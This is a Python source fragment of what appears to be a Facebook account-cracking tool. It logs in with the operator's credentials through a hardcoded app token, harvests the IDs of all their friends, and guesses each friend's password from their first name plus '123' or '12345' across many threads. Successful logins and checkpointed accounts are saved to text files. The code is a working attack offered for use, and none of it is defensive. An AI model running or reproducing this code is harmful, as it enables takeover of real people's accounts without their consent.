def gen(self):
	self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("[?] email: "),getpass("[?] passs: "))).json()
	try:
		self.token=self.r["access_token"]
	except:
		exit("%s[!]%s failed when generate access token."%(R,N))
	print("%s[*]%s grabbing id ..."%(G,N))
	for x in requests.get(self.a.format(
		"me/friends?access_token=%s"%(
			self.token))).json()["data"]:
		self.target.append(x["id"])
	p=ThreadPool(input("[?] Enter Threads (int): "))
	p.map(self.k,self.target)
	self.panggil()

def panggil(self):
	if len(self.found) !=0:
		print("\n\n%s[*]%s found: %s"%(G,N,len(
			self.found)))
		for x in self.found:
			print("%s[*]%s %s"%(G,N,x))
		print("\n%s[*]%s output: multiresult.txt"%(
			G,N))
	if len(self.cp) !=0:
		print("\n\n%s[*]%s checkpoint: %s"%(G,N,len(
			self.cp)))
		for x in self.cp:
			print("%s[*]%s %s"%(G,N,x))
		print("\n%s[*]%s output: checkpoint.txt"%(
			G,N))
	if len(self.found) ==0 and len(self.cp) ==0:
		print("\n%s[:(]%s no result found."%(R,N))

def k(self,target):
	self.user=requests.get(self.a.format(
		target+"?access_token=%s"%(
	self.token))).json()["first_name"]
	for x in [self.user+"123",self.user+"12345"]:
		r=requests.post(self.i.format("login"),
			data=
				{
					"email":target,
					"pass":x
				}
		).url
		if "save-device" in r or "m_sess" in r:
			open("multiresult.txt","a").write(
				"%s|%s\n"%(target,x))
			self.found.append("%s|%s"%(target,x))
			break
		if "checkpoint" in r or "challange" in r:
			self.cp.append("%s|%s"%(target,x))
			open("checkpoint.txt","a").write(
				"%s|%s\n"%(target,x))
			break
	self.loop+=1
	print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
		len(self.cp),self.loop,len(self.target),
			G,len(self.found),N)),;sys.stdout.flush()